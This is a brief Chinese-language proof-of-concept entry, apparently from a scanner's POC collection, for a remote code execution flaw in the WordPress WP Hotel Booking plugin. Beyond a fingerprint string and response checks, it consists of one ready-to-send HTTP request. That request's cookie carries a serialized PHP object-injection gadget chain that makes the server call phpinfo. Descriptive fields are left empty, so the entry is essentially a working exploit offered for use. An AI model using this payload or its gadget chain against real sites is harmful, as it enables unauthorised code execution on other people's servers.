﻿# Wordpress thimpress_hotel_booking RCE漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="wp-content/plugins/wp-hotel-booking"

> 验证脚本：HTTP

```
GET / HTTP/1.1
Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"phpinfo"%3B}}}
```

> 响应代码特征：200

> 响应内容特征：phpinfo

> 上传文件定位：

> 验证文件来源：Wordpress thimpress_hotel_booking RCE漏洞.poc

